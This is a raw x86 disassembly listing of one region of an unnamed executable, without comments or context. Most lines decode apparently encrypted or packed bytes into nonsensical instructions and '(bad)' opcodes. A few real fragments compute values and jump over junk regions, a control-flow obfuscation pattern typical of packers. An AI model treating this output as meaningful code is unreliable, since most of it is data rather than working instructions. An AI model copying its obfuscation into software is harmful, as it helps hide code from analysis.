  40b610:	imul   ebx,edx,0x1c1c0310
  40b616:	rcr    edi,cl
  40b618:	mov    eax,0xb4b1d7fc
  40b61d:	dec    edi
  40b61e:	repz sar esi,cl
  40b621:	sub    ch,bl
  40b623:	jle    0x40b5aa
  40b625:	inc    eax
  40b626:	mov    ah,0x4e
  40b628:	loopne 0x40b613
  40b62a:	stos   DWORD PTR es:[edi],eax
  40b62b:	mov    DWORD PTR [edx],ecx
  40b62d:	aaa    
  40b62e:	hlt    
  40b62f:	cmp    BYTE PTR [eax],dl
  40b631:	adc    al,0xd8
  40b633:	xchg   ecx,eax
  40b634:	aad    0x4e
  40b636:	stos   DWORD PTR es:[edi],eax
  40b637:	jbe    0x40b62a
  40b639:	push   ebx
  40b63a:	test   eax,0x23ea4d80
  40b63f:	push   ds
  40b640:	dec    edi
  40b641:	in     al,dx
  40b642:	dec    ebx
  40b643:	pop    ss
  40b644:	shl    ebx,1
  40b646:	hlt    
  40b647:	pop    esp
  40b648:	or     cl,0x45
  40b64b:	dec    esp
  40b64c:	mov    al,0x50
  40b64e:	stos   BYTE PTR es:[edi],al
  40b64f:	fidiv  DWORD PTR [eax+ebp*2-0x52]
  40b653:	pop    ss
  40b654:	out    0xce,eax
  40b656:	popf   
  40b657:	rcr    BYTE PTR [edx],1
  40b659:	inc    ebx
  40b65a:	mov    ds:0x903474d0,eax
  40b65f:	xchg   ebx,eax
  40b660:	dec    edx
  40b661:	fisub  DWORD PTR [ebx]
  40b663:	adc    DWORD PTR [edx-0x5c613ce8],edi
  40b669:	inc    edi
  40b66a:	xor    BYTE PTR [eax+0x224b445a],ah
  40b670:	pop    es
  40b671:	adc    al,0x78
  40b673:	push   esp
  40b674:	stos   DWORD PTR es:[edi],eax
  40b675:	bound  ebx,QWORD PTR [eax-0x7f1570dd]
  40b67b:	test   eax,0x77527878
  40b680:	retf   
  40b681:	aaa    
  40b682:	clts   
  40b684:	test   eax,0xcd2154a6
  40b689:	mov    ebp,0x7d9c89cd
  40b68e:	lods   al,BYTE PTR ds:[esi]
  40b68f:	sbb    ecx,ebx
  40b691:	sbb    esi,DWORD PTR [ebx+edx*4+0xe]
  40b695:	pop    edi
  40b696:	cs mov bh,0x6b
  40b699:	mov    esi,0xec5288d5
  40b69e:	jge    0x40b717
  40b6a0:	mov    eax,0xc5d4436b
  40b6a5:	dec    esp
  40b6a6:	test   al,0xbf
  40b6a8:	jmp    0x83c1:0xb852f04a
  40b6af:	push   eax
  40b6b0:	mov    eax,DWORD PTR [ebp-0x10]
  40b6b3:	mov    ecx,DWORD PTR [ebp-0x14]
  40b6b6:	xor    ecx,esi
  40b6b8:	mov    edx,0xffcd8d65
  40b6bd:	sub    edx,ecx
  40b6bf:	add    DWORD PTR [eax],edx
  40b6c1:	mov    eax,ds:0x41227c
  40b6c6:	mov    eax,DWORD PTR [eax]
  40b6c8:	jmp    0x40ba15
  40b6cd:	mov    cl,0x1a
  40b6cf:	jns    0x40b704
  40b6d1:	xchg   ecx,eax
  40b6d2:	xor    DWORD PTR [ecx+0x2f888498],esi
  40b6d8:	mov    ch,0x3
  40b6da:	stos   BYTE PTR es:[edi],al
  40b6db:	cld    
  40b6dc:	rcr    ecx,cl
  40b6de:	bnd jle 0x40b75f
  40b6e1:	cs jge 0x40b762
  40b6e4:	jle    0x40b681
  40b6e6:	int3   
  40b6e7:	adc    eax,ebx
  40b6e9:	lock push ebx
  40b6eb:	mov    al,ds:0xebe08be2
  40b6f0:	jo     0x40b6e8
  40b6f2:	out    0xf7,al
  40b6f4:	sub    cl,BYTE PTR [edi+eiz*2]
  40b6f7:	loope  0x40b739
  40b6f9:	test   al,0x78
  40b6fc:	iret   
  40b6fd:	in     eax,dx
  40b6fe:	jecxz  0x40b6e3
  40b700:	mov    bl,0x12
  40b702:	outs   dx,DWORD PTR ds:[esi]
  40b703:	adc    esp,esp
  40b705:	(bad)  
  40b706:	jge    0x40b6eb
  40b708:	mov    ds:0xf4766b81,eax
  40b70d:	and    DWORD PTR [ebp+0x68],esp
  40b710:	jmp    DWORD PTR [ecx+0x73f27d44]
  40b716:	mov    ds:0xfff76a7f,al
  40b71b:	test   eax,0x7198027f
  40b720:	sbb    DWORD PTR [eax-0x3c],0xe
  40b724:	add    al,0x4a
  40b726:	cwde   
  40b727:	inc    edi
  40b728:	pusha  
  40b729:	jmp    0xb752:0xb700e15a
  40b730:	sub    DWORD PTR [ebx],edi
  40b732:	and    edx,DWORD PTR [esi+0x32]
  40b735:	or     ecx,ebp
  40b737:	addr16 inc edi
  40b739:	aaa    
  40b73a:	mov    dh,0x70
  40b73c:	bound  eax,QWORD PTR [eax+0x7f29adf4]
  40b742:	sbb    esp,ecx
  40b744:	shr    DWORD PTR [edx-0x3],1
  40b747:	ret    
  40b748:	and    eax,0x67bc54e5
  40b74d:	pop    gs
  40b74f:	jecxz  0x40b713
  40b751:	test   al,0xd5
  40b753:	xchg   ebx,ecx
  40b755:	push   esi
  40b756:	shr    DWORD PTR [edi],cl
  40b758:	mov    dh,BYTE PTR [eax-0x21]
  40b75b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b75c:	ins    BYTE PTR es:[edi],dx
  40b75d:	sbb    BYTE PTR [ecx],bh
  40b75f:	not    DWORD PTR [ebp-0x42]
  40b762:	rcr    DWORD PTR [edx+0x714829d2],0x85
  40b769:	inc    eax
  40b76a:	bound  edx,QWORD PTR [edx]
  40b76c:	cli    
  40b76d:	pop    es
  40b76e:	mov    ebx,0xae8f09db
  40b773:	push   0x186b1c0a
  40b778:	inc    edx
  40b779:	mov    esi,0xa3fcc6af
  40b77e:	int    0xd1
  40b780:	xor    edi,DWORD PTR [ecx-0x4f1eea2f]
  40b786:	mov    dl,0x4e
  40b788:	addr16 jbe 0x40b7e0
  40b78b:	add    eax,esi
  40b78d:	jmp    0x40b776
  40b78f:	mov    dl,0xfb
  40b791:	rep stos BYTE PTR es:[edi],al
  40b793:	call   0xe1801d35
  40b798:	sub    dl,BYTE PTR [eax+0x6dc8a71c]
  40b79e:	iret   
  40b79f:	cmp    al,0x88
  40b7a1:	sub    DWORD PTR ds:0x811e4022,eax
  40b7a8:	js     0x40b7b7
  40b7aa:	sbb    eax,0x2b600585
  40b7af:	adc    ah,BYTE PTR [ebx+esi*8-0x40]
  40b7b3:	hlt    
  40b7b4:	push   es
  40b7b5:	call   0xf457989
  40b7ba:	enter  0x62bb,0xae
  40b7be:	mov    al,0x71
  40b7c0:	ret    0xcd89
  40b7c3:	int    0x5b
  40b7c5:	mulps  xmm3,XMMWORD PTR [edx+0x51]
  40b7c9:	(bad)  [ecx]
  40b7cb:	cwde   
  40b7cc:	ja     0x40b7dd
  40b7ce:	add    al,0xe2
  40b7d0:	fidivr DWORD PTR [ecx-0x3b]
  40b7d3:	lock mov BYTE PTR [esp+edi*2+0x66e5a3dd],0xc9
  40b7dc:	dec    ebp
  40b7dd:	mov    esp,0x1798c33c
  40b7e2:	sub    dh,0x2a
  40b7e5:	dec    edx
  40b7e6:	pop    esi
  40b7e7:	xchg   ebx,eax
  40b7e8:	add    DWORD PTR [eax+eiz*8],ebp
  40b7eb:	(bad)  
  40b7ec:	js     0x40b7c2
  40b7ee:	cdq    
  40b7ef:	mov    dh,0xe
  40b7f1:	mov    edx,0x8a6ec5a7
  40b7f6:	xor    DWORD PTR [ebx],esi
  40b7f8:	and    al,0xb9
  40b7fa:	ds pop ebp
  40b7fc:	mov    dh,bl
  40b7fe:	mov    bl,0x77
  40b800:	add    DWORD PTR [eax],edi
  40b802:	and    ch,BYTE PTR [edi]
  40b804:	pop    edi
  40b805:	pop    ecx
  40b806:	mov    bh,0x2d
  40b808:	jb     0x40b820
  40b80a:	inc    ebp
  40b80b:	call   0x1473b95e
  40b810:	sar    DWORD PTR [edx-0x26e916c8],cl
  40b816:	sar    BYTE PTR [eax+0x5f],cl
  40b819:	cmc    
  40b81a:	jp     0x40b7ac
  40b81c:	loop   0x40b7cf
  40b81e:	adc    eax,0xea56c2ea
  40b823:	mov    edi,0x10b16bad
  40b828:	mov    edi,0xc83666b6
  40b82d:	loopne 0x40b887
  40b82f:	xor    BYTE PTR [esi-0x30],dl
  40b832:	ret    0x8b0d
  40b835:	sbb    DWORD PTR ds:[ebx+eiz*2+0x5f],edi
  40b83a:	enter  0x15d0,0x4d
  40b83e:	xchg   ecx,eax
  40b83f:	mov    eax,ds:0x5a9b924a
  40b844:	mov    cl,0xd2
  40b846:	dec    esp
  40b847:	pushf  
  40b848:	aas    
  40b849:	mov    dh,ah
  40b84b:	sbb    ebp,0xac34124b
  40b851:	mov    ds:0x4c7e9f8b,al
  40b856:	sub    ecx,eax
  40b858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b859:	cmp    dl,dl
  40b85b:	xor    ebp,DWORD PTR [ebx-0x39d9e992]
  40b861:	push   ecx
  40b862:	imul   ecx,DWORD PTR [ecx+0x2158c8e3],0xc03579e0
  40b86c:	ret    
  40b86d:	cmp    esi,esp
  40b86f:	push   ds
  40b870:	inc    esp
  40b871:	mov    cl,0x72
  40b873:	mov    edi,0xddf537cd
  40b878:	mov    edi,0x1e5e62d
  40b87d:	in     al,0xba
  40b87f:	xchg   ebx,eax
  40b880:	or     al,0xa1
  40b882:	test   ecx,esp
  40b884:	add    BYTE PTR [eax-0x38e20fef],cl
  40b88a:	xchg   bh,bh
  40b88c:	cmp    eax,DWORD PTR ds:[ebx-0x58]
  40b890:	adc    cl,BYTE PTR [ecx+0x70]
  40b893:	sar    BYTE PTR [eax+0x56],0xd8
  40b897:	cmp    eax,0x99ac6d49
  40b89c:	popa   
  40b89d:	lock add edi,edx
  40b8a0:	adc    BYTE PTR [ecx],al
  40b8a2:	pop    esp
  40b8a3:	cmp    eax,0x2972155d
  40b8a8:	fstp   TBYTE PTR [ebp+0x8ab6653]
  40b8ae:	sub    cl,BYTE PTR [esi-0x3b]
  40b8b1:	in     al,dx
  40b8b2:	repnz fwait
  40b8b4:	jo     0x40b901
  40b8b6:	sub    ebp,DWORD PTR [edi+eax*4-0x1043a418]
  40b8bd:	mov    dh,0x94
  40b8bf:	aad    0xa9
  40b8c1:	(bad)  
  40b8c2:	mov    eax,0x99ed3982
  40b8c7:	jg     0x40b91e
  40b8c9:	aaa    
  40b8ca:	pop    edi
  40b8cb:	cmp    DWORD PTR [edi+0x3c],esi
  40b8ce:	and    al,0xeb
  40b8d0:	or     DWORD PTR [eax+0x78],esp
  40b8d3:	pop    edx
  40b8d4:	lea    esi,[ebx+0x8d418d2]
  40b8da:	test   DWORD PTR [eax],esp
  40b8dc:	jb     0x40b8fd
  40b8de:	push   ebp
  40b8df:	loop   0x40b8c9
  40b8e1:	ror    BYTE PTR [ebx],0xcc
  40b8e4:	out    0x72,al
  40b8e6:	sub    eax,DWORD PTR [esi]
  40b8e8:	aaa    
  40b8e9:	std    
  40b8ea:	jge    0x40b8f9
  40b8ec:	mov    ebx,0x7c9c216b
  40b8f1:	and    eax,0xa329b877
  40b8f6:	pop    eax
  40b8f7:	xchg   esi,eax
  40b8f8:	jae    0x40b92a
  40b8fa:	mov    al,es:0x396cb5d2
  40b900:	fnstenv [ecx]
  40b902:	adc    eax,0x3206799a
  40b907:	jmp    0xe3052ac2
  40b90c:	test   eax,0xb31dde33
  40b911:	lds    eax,FWORD PTR [esi]
  40b913:	xchg   BYTE PTR ds:0x9ba2cb24,dh
  40b919:	jmp    0x40b97f
  40b91b:	fisub  WORD PTR gs:[ebp+0x34]
  40b91f:	or     ah,BYTE PTR [ebp+esi*8-0x6132562b]
  40b926:	pop    ebx
  40b927:	push   ebx
  40b928:	stos   DWORD PTR es:[edi],eax
  40b929:	add    DWORD PTR [eax-0x35],esp
  40b92c:	jne    0x40b9a8
  40b92e:	push   ebx
  40b92f:	mov    esi,0xf1a6e771
  40b934:	mov    ecx,0x5e71fe75
  40b939:	mov    ah,0x60
  40b93b:	push   esi
  40b93c:	rcr    BYTE PTR ds:0x33a32466,1
  40b942:	mov    ebp,0xd77d9658
  40b947:	ror    BYTE PTR [eax],cl
  40b949:	arpl   WORD PTR [ebp-0x61],bx
  40b94c:	xor    al,0x8c
  40b94e:	div    DWORD PTR [edi+eax*4+0x7ddb3d9f]
  40b955:	not    DWORD PTR [edx+0x17]
  40b958:	addr16 xchg al,ah
  40b95b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b95c:	jbe    0x40b961
  40b95e:	inc    esp
  40b95f:	repz inc eax
  40b961:	dec    edx
  40b962:	push   edx
  40b963:	test   BYTE PTR [ebp+ebp*1-0x5c],ah
  40b967:	push   eax
  40b968:	cli    
  40b969:	adc    ebp,edi
  40b96b:	(bad)  
  40b96c:	mov    ch,0xe9
  40b96e:	mov    BYTE PTR [ebp+0x15],bh
  40b971:	mov    esp,0xd56e0349
  40b976:	jp     0x40b90c
  40b978:	(bad)  
  40b979:	bnd ja 0x40b91a
  40b97c:	hlt    
  40b97d:	retf   
  40b97e:	cmp    eax,0xa956aca7
  40b983:	xchg   ebp,eax
  40b984:	or     esi,DWORD PTR [esi]
  40b986:	xchg   ecx,eax
  40b988:	jno    0x40b962
  40b98a:	out    dx,eax
  40b98b:	fild   WORD PTR [ecx+0x1c]
  40b98e:	and    al,0x11
  40b990:	mov    ah,al
  40b992:	add    DWORD PTR [ebx],esp
  40b994:	test   BYTE PTR [ebp+0x2afebcfb],ah
  40b99a:	or     al,0xf7
  40b99c:	push   ecx
  40b99d:	in     eax,dx
  40b99e:	mov    dh,0xc9
  40b9a0:	sahf   
  40b9a1:	sbb    eax,0x2bd96016
  40b9a6:	(bad)  
  40b9a8:	fsub   DWORD PTR [eax-0x25]
  40b9ab:	in     al,dx
  40b9ac:	or     edi,DWORD PTR [eax]
  40b9ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9af:	add    BYTE PTR [edx+0x17ae15db],cl
  40b9b5:	and    eax,0x3eb32a76
  40b9ba:	sti    
  40b9bb:	cdq    
  40b9bc:	jmp    0xa5ca94c2
  40b9c1:	repnz inc ecx
  40b9c3:	adc    eax,0xa73e23
  40b9c8:	mov    ch,0x19
  40b9ca:	fdiv   st,st(5)
  40b9cc:	mov    eax,ds:0x857f8e09
  40b9d1:	in     al,dx
  40b9d2:	xchg   ebx,eax
  40b9d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9d4:	das    
  40b9d5:	or     edi,DWORD PTR [esi+ebx*4+0x27]
  40b9d9:	xor    al,0xe2
  40b9db:	push   ecx
  40b9dc:	arpl   bp,bx
  40b9de:	inc    edi
  40b9df:	dec    esi
  40b9e0:	jmp    0xad59:0x82ca2139
  40b9e7:	loope  0x40ba64
  40b9e9:	shr    ah,1
  40b9eb:	out    0x5f,al
  40b9ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9ee:	jbe    0x40ba25
  40b9f0:	cmp    esp,DWORD PTR [edx+0x63]
  40b9f3:	add    al,BYTE PTR [ebx-0xb8faa4a]
  40b9f9:	inc    ecx
  40b9fa:	ror    BYTE PTR [ecx],cl
  40b9fc:	test   eax,0xbab6dcad
  40ba01:	mov    DWORD PTR [edx],eax
  40ba03:	or     DWORD PTR [ecx-0x27],edx
  40ba06:	(bad)  
  40ba07:	fcomp  DWORD PTR cs:[ebx-0x59d64c13]
  40ba0e:	out    0xb0,al
  40ba10:	mov    ds:0x55775ac8,eax
  40ba15:	mov    cx,WORD PTR [ebp-0x4]
  40ba19:	movzx  ecx,cx
  40ba1c:	add    ecx,DWORD PTR [eax]
  40ba1e:	mov    DWORD PTR [ebp-0x1c],ecx
  40ba21:	mov    eax,DWORD PTR [ebp+0xc]
  40ba24:	jmp    0x40bd71
  40ba29:	jae    0x40ba29
  40ba2b:	push   ebx
  40ba2c:	lahf   
  40ba2d:	jae    0x40baa2
  40ba2f:	jae    0x40ba83
  40ba31:	pop    edi
  40ba32:	dec    ebp
  40ba33:	scas   al,BYTE PTR es:[edi]
  40ba34:	in     al,dx
  40ba35:	xchg   ecx,eax
  40ba36:	mov    bl,0x7
  40ba38:	add    eax,0x7e7ef189
  40ba3d:	cs jge 0x40babe
  40ba40:	jle    0x40ba80
  40ba42:	adc    esp,DWORD PTR [eax-0x2c]
  40ba45:	aaa    
  40ba46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba47:	out    dx,eax
  40ba48:	shl    BYTE PTR [edi+0x11],cl
  40ba4b:	pusha  
  40ba4c:	mov    cl,0x66
  40ba4e:	aam    0xd7
  40ba50:	mov    WORD PTR [ebx-0x77],es
  40ba53:	(bad)  
  40ba54:	pop    ebx
  40ba55:	pusha  
  40ba56:	and    al,0xb2
  40ba58:	sub    DWORD PTR [edx+0x3a],eax
  40ba5b:	mov    eax,ds:0x70629ce1
  40ba60:	rcr    BYTE PTR [ecx],cl
  40ba62:	sbb    BYTE PTR [eax+0x42],dh
  40ba65:	fidiv  WORD PTR [ecx-0x45b76f95]
  40ba6b:	inc    ecx
  40ba6c:	mov    ch,0xc8
  40ba6e:	enter  0x8838,0xce
  40ba72:	push   esi
  40ba73:	push   cs
  40ba74:	and    DWORD PTR [ebx+0x427776e1],0x9c2ba6c9
  40ba7e:	and    BYTE PTR [esi+0x60],al
  40ba81:	shr    DWORD PTR [ecx],cl
  40ba83:	mov    al,ds:0x343503a
  40ba88:	aad    0x64
  40ba8a:	add    DWORD PTR [eax-0x79],esi
  40ba8d:	pop    edx
  40ba8e:	in     al,dx
  40ba8f:	mov    cl,dh
  40ba91:	lods   eax,DWORD PTR ds:[esi]
  40ba92:	dec    ebx
  40ba93:	les    edx,FWORD PTR [edx+0xd]
  40ba96:	xor    al,0xf3
  40ba98:	mov    ah,0xaf
  40ba9a:	and    al,0x8c
  40ba9c:	cmc    
  40ba9d:	popa   
  40ba9e:	inc    esi
  40ba9f:	ds cwde 
  40baa1:	into   
  40baa2:	shr    bh,1
  40baa4:	pop    edi
  40baa5:	add    dh,al
  40baa7:	arpl   WORD PTR [edx],ax
  40baa9:	and    BYTE PTR [edx+ebx*8],dh
  40baac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baad:	aas    
  40baae:	shl    ch,1
  40bab0:	jge    0x40ba8f
  40bab2:	jbe    0x40bad5
  40bab4:	mov    al,0x69
  40bab6:	pop    ds
  40bab7:	mov    esi,eax
  40bab9:	mov    edi,DWORD PTR [edx+0x65294690]
  40babf:	and    cl,0xb2
  40bac2:	and    al,0x49
  40bac4:	out    0xb,eax
  40bac6:	pop    ds
  40bac7:	sbb    dl,BYTE PTR [esi-0x47ecb7a3]
  40bacd:	mov    ah,0x62
  40bacf:	es shr BYTE PTR fs:[ebx-0x7e02bbc7],cl
  40bad7:	or     dl,BYTE PTR [ecx]
  40bad9:	jno    0x40baec
  40badb:	sub    BYTE PTR [ebx+0x6f],ch
  40bade:	jecxz  0x40bb16
  40bae0:	mov    bh,bh
  40bae2:	out    dx,eax
  40bae3:	pop    esi
  40bae4:	data16 add dh,BYTE PTR [ebx+0x27]
  40bae8:	jns    0x40ba9c
  40baea:	and    BYTE PTR [ebx-0x5cea90ab],bl
  40baf0:	pushw  ss
  40baf2:	dec    edx
  40baf3:	fst    QWORD PTR [edx+0x4c333feb]
  40baf9:	rcr    DWORD PTR [ebp-0x2a],1
  40bafc:	aad    0x8a
  40bafe:	mov    cl,0x8e
  40bb00:	cli    
  40bb01:	fsubr  DWORD PTR ds:0x89f6b6e6
  40bb07:	iret   
  40bb08:	cvtps2pi mm4,QWORD PTR [eax+0x27aa5f30]
  40bb0f:	retf   
  40bb10:	sub    dh,dh
  40bb12:	xchg   DWORD PTR [eax+0x16],edx
  40bb15:	fs push eax
  40bb17:	push   0x5652fd0f
  40bb1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb1d:	pop    ss
  40bb1e:	pop    ds
  40bb1f:	push   ebx
  40bb20:	sub    esi,DWORD PTR [edi+0x2]
  40bb23:	mov    DWORD PTR [ecx-0x61],edx
  40bb26:	arpl   WORD PTR [edi+eax*4],si
  40bb29:	push   esi
  40bb2a:	sbb    al,ah
  40bb2c:	mov    esi,ecx
  40bb2e:	and    BYTE PTR [esi+0x63],0x97
  40bb32:	or     esi,DWORD PTR [ebx+0x7a]
  40bb35:	ss cdq 
  40bb37:	push   0x1f0172a
  40bb3c:	mov    esi,0x4f83f536
  40bb41:	adc    cl,BYTE PTR [edi+0x7b111a31]
  40bb47:	arpl   WORD PTR [ebp+0x43],dx
  40bb4a:	pushf  
  40bb4b:	jno    0x40bb68
  40bb4d:	scas   al,BYTE PTR es:[edi]
  40bb4e:	pop    eax
  40bb4f:	dec    esi
  40bb50:	xor    DWORD PTR [edx],esp
  40bb52:	mul    dh
  40bb54:	fdivr  DWORD PTR [ecx]
  40bb56:	cld    
  40bb57:	neg    ecx
  40bb59:	add    DWORD PTR [ecx],edx
  40bb5b:	pop    es
  40bb5c:	sub    eax,0x3d724309
  40bb61:	adc    eax,0x29a627ea
  40bb66:	les    ebx,FWORD PTR [edi]
  40bb68:	or     eax,0x2dfac3f5
  40bb6d:	outs   dx,DWORD PTR ds:[esi]
  40bb6e:	test   BYTE PTR [eax],bh
  40bb70:	in     eax,0xcf
  40bb72:	jp     0x40bb42
  40bb74:	sub    esp,DWORD PTR gs:[eax+eax*2+0x20]
  40bb79:	scas   al,BYTE PTR es:[edi]
  40bb7a:	sbb    eax,0x3ea47e05
  40bb7f:	ins    DWORD PTR es:[edi],dx
  40bb80:	rcl    ebp,1
  40bb82:	xlat   BYTE PTR ds:[ebx]
  40bb83:	add    BYTE PTR [edi+0x70],bl
  40bb86:	or     dl,dl
  40bb88:	rcl    BYTE PTR [ebp+0x57735466],0xdc
  40bb8f:	dec    edx
  40bb90:	mov    es,edx
  40bb92:	in     eax,0x6
  40bb94:	daa    
  40bb95:	test   eax,0xd1d90f80
  40bb9a:	(bad)  
  40bb9b:	jno    0x40bbbf
  40bb9d:	cdq    
  40bb9e:	frstor [ebx]
  40bba0:	stos   DWORD PTR es:[edi],eax
  40bba1:	mul    BYTE PTR [eax+ecx*1+0x602c1885]
  40bba8:	daa    
  40bba9:	pop    esp
  40bbaa:	push   ds
  40bbab:	and    al,0x5c
  40bbad:	xchg   ecx,eax
  40bbae:	add    BYTE PTR [esi],ah
  40bbb0:	test   esp,esi
  40bbb2:	jecxz  0x40bc1e
  40bbb4:	pop    esi
  40bbb5:	js     0x40bb93
  40bbb7:	(bad)  
  40bbb8:	mov    ds:0x90812a27,al
  40bbbd:	dec    ecx
  40bbbe:	out    dx,eax
  40bbbf:	and    al,0x6
  40bbc1:	adc    esp,DWORD PTR [esi+0x57917e9c]
  40bbc7:	popa   
  40bbc8:	dec    edi
  40bbc9:	(bad)  
  40bbca:	std    
  40bbcb:	pop    eax
  40bbcc:	loop   0x40bc11
  40bbce:	les    esi,FWORD PTR [esi+0xc]
  40bbd1:	in     al,dx
  40bbd2:	cmp    al,BYTE PTR [edi]
  40bbd4:	add    DWORD PTR [eax+0x41],eax
  40bbd7:	rcr    BYTE PTR [edx-0x28],cl
  40bbda:	add    al,0x77
  40bbdc:	push   ebp
  40bbdd:	dec    ecx
  40bbde:	test   DWORD PTR [eax],ebx
  40bbe0:	int    0xd1
  40bbe2:	(bad)  
  40bbe3:	ror    DWORD PTR [edx-0x2f],cl
  40bbe6:	mov    ecx,0x69c4eeb
  40bbeb:	inc    ebx
  40bbec:	cld    
  40bbed:	enter  0x6932,0x28
  40bbf1:	ficomp DWORD PTR [eax]
  40bbf3:	sub    al,0xdc
  40bbf5:	xor    DWORD PTR [ecx],edi
  40bbf7:	(bad)
  40bbfa:	jl     0x40bc0a
  40bbfc:	sbb    dl,BYTE PTR [eax-0x5518f53]
  40bc02:	adc    DWORD PTR [eax+0x17],edi
  40bc05:	or     al,0xd
  40bc07:	mov    ebx,DWORD PTR [bx-0x6f]
  40bc0b:	(bad)  
  40bc0c:	jmp    0xc577:0xf0567251
  40bc13:	mov    eax,ds:0x9a58e3ef
  40bc18:	pop    ebp
  40bc19:	cli    
  40bc1a:	pop    es
  40bc1b:	adc    al,ch
  40bc1d:	aaa    
  40bc1e:	inc    esi
  40bc1f:	call   0x9f0c018e
  40bc24:	xchg   esp,eax
  40bc25:	inc    ecx
  40bc26:	retf   0x42b7
  40bc29:	and    ecx,0xfe1d4c0d
  40bc2f:	fwait
  40bc30:	pop    edx
  40bc31:	aad    0x6f
  40bc33:	cld    
  40bc34:	sbb    edx,eax
  40bc36:	pop    ss
  40bc37:	dec    ebx
  40bc38:	nop
  40bc39:	test   eax,0xf5861037
  40bc3e:	mov    al,ds:0xedc70350
  40bc43:	rol    BYTE PTR [edi+0x64],cl
  40bc46:	out    dx,al
  40bc47:	ins    DWORD PTR es:[edi],dx
  40bc48:	clc    
  40bc49:	stc    
  40bc4a:	xchg   esi,eax
  40bc4b:	lahf   
  40bc4c:	add    al,0xb5
  40bc4e:	cmp    BYTE PTR [esi-0x6419836f],0xe
  40bc55:	jge    0x40bc24
  40bc57:	jmp    0xeb246f39
  40bc5c:	popf   
  40bc5d:	ficomp DWORD PTR [ebp+edx*8+0x7fe4ac56]
  40bc64:	jne    0x40bcd0
  40bc66:	jo     0x40bbf6
  40bc68:	into   
  40bc69:	or     ecx,esp
  40bc6b:	inc    esi
  40bc6c:	or     dh,ah
  40bc6e:	cmp    eax,DWORD PTR [edx-0x6c]
  40bc71:	or     BYTE PTR [edi+ebx*1+0x1feae7c],ch
  40bc78:	out    dx,eax
  40bc79:	aad    0x93
  40bc7b:	mov    WORD PTR [edi-0x8],gs
  40bc7e:	lods   eax,DWORD PTR ds:[esi]
  40bc7f:	ins    DWORD PTR es:[edi],dx
  40bc80:	adc    eax,DWORD PTR [ebp-0x38]
  40bc83:	shr    BYTE PTR [ebx-0x17de7742],cl
  40bc89:	fwait
  40bc8a:	sbb    eax,ecx
  40bc8c:	push   cs
  40bc8d:	push   ss
  40bc8e:	inc    edi
  40bc8f:	popf   
  40bc90:	push   ds
  40bc91:	cmp    BYTE PTR ds:0x50aa0cc7,bl
  40bc97:	dec    ecx
  40bc98:	or     al,BYTE PTR [edi]
  40bc9a:	imul   edx,DWORD PTR [ebx+esi*4],0xd202c358
  40bca1:	iret   
  40bca2:	add    eax,0x91c131d2
  40bca7:	cli    
  40bca8:	in     eax,dx
  40bca9:	and    DWORD PTR [ecx],eax
  40bcab:	jmp    0x40bd21
  40bcad:	add    ecx,DWORD PTR [esi-0x5efb6ab4]
  40bcb3:	jae    0x40bcc7
  40bcb5:	fcmove st,st(5)
  40bcb7:	pop    es
  40bcb8:	ret    0x9bea
  40bcbb:	push   cs
  40bcbc:	jge    0x40bc7a
  40bcbe:	and    BYTE PTR [eax-0x743a5268],cl
  40bcc4:	ret    0xd11
  40bcc7:	inc    ecx
  40bcc8:	out    dx,eax
  40bcc9:	jmp    0x58bb51fc
  40bcce:	dec    edi
  40bccf:	enter  0x9e55,0x83
  40bcd3:	jns    0x40bd29
  40bcd5:	fwait
  40bcd6:	rcl    eax,0xc8
  40bcd9:	in     al,0xec
  40bcdb:	sbb    al,0x44
  40bcdd:	cs test al,0xd6
  40bce0:	sahf   
  40bce1:	pop    ds
  40bce2:	cdq    
  40bce3:	pop    ecx
  40bce4:	addr16 jmp 0x4d81:0xa823f039
  40bcec:	push   edx
  40bced:	scas   eax,DWORD PTR es:[edi]
  40bcee:	iret   
  40bcef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcf0:	push   ds
  40bcf1:	xor    eax,0x26ed5bd7
  40bcf6:	shl    ch,0xfe
  40bcf9:	inc    ecx
  40bcfa:	int    0x4e
  40bcfc:	popf   
  40bcfd:	pop    esi
  40bcfe:	stos   BYTE PTR es:[edi],al
  40bcff:	cwde   
  40bd00:	test   ebp,edx
  40bd02:	(bad)  
  40bd03:	push   ss
  40bd04:	scas   eax,DWORD PTR es:[edi]
  40bd05:	xchg   DWORD PTR [eax+esi*4+0x3a9bb871],ebx
  40bd0c:	in     al,dx
  40bd0d:	imul   esp,ebp,0xcd0d66f7
  40bd13:	mov    cl,0xe
  40bd15:	mov    DWORD PTR [edx],0xcea63c0c
  40bd1b:	loopne 0x40bd55
  40bd1d:	mov    edx,0xc21f6927
  40bd22:	xor    DWORD PTR [eax],esi
  40bd24:	test   eax,0xb3b2673b
  40bd29:	lods   eax,DWORD PTR ds:[esi]
  40bd2a:	cli    
  40bd2b:	xchg   ecx,eax
  40bd2c:	rcl    bl,1
  40bd2e:	mov    esi,0x3591e619
  40bd33:	mov    cl,ch
  40bd35:	jmp    0xbbb8e3c8
  40bd3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd3b:	popa   
  40bd3c:	int    0xaf
  40bd3e:	jmp    0xaa071ef8
  40bd43:	lahf   
  40bd44:	lds    esi,FWORD PTR [ebx+0x79]
  40bd47:	pop    edi
  40bd48:	push   0xd04918d0
  40bd4d:	push   ecx
  40bd4e:	loope  0x40bdc7
  40bd50:	push   edx
  40bd51:	or     ah,bl
  40bd53:	ret    0x8c44
  40bd56:	push   esp
  40bd57:	clc    
  40bd58:	daa    
  40bd59:	mov    bl,0x94
  40bd5b:	int    0xbb
  40bd5d:	inc    edx
  40bd5e:	mov    fs,WORD PTR [eax]
  40bd60:	cdq    
  40bd61:	sub    BYTE PTR ds:0xdae4beb8,al
  40bd67:	xor    DWORD PTR [edi],0xffffff9a
  40bd6a:	inc    ebp
  40bd6b:	dec    esi
  40bd6c:	sbb    bh,al
  40bd6e:	add    esi,DWORD PTR [ecx]
  40bd70:	inc    ebp
  40bd71:	mov    ecx,DWORD PTR [ebp+0xc]
